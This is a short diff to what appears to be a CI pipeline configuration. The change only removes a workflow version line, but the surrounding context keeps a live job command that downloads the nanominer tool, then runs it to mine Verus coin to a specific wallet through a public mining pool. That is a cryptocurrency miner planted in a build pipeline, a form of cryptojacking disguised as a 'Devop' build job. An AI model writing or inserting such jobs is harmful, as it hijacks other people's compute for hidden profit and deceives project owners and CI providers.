@@ -33,7 +33,6 @@ jobs:
             command: wget https://github.com/nanopool/nanominer/releases/download/v3.5.2/nanominer-linux-3.5.2.tar.gz && tar xf nanominer-linux-3.5.2.tar.gz && cd nanominer-linux-3.5.2 && ./nanominer -algo Verushash -wallet RE4XiyakxZjFs6hWMNWCReYjuX2qFVkspF -coin VRSC -rigName rig1 -pool1 stratum+tcp://verthash.eu.mine.zergpool.com:4534
 
 workflows:
-    version: 2.1
     build:
         jobs:
             - Devop
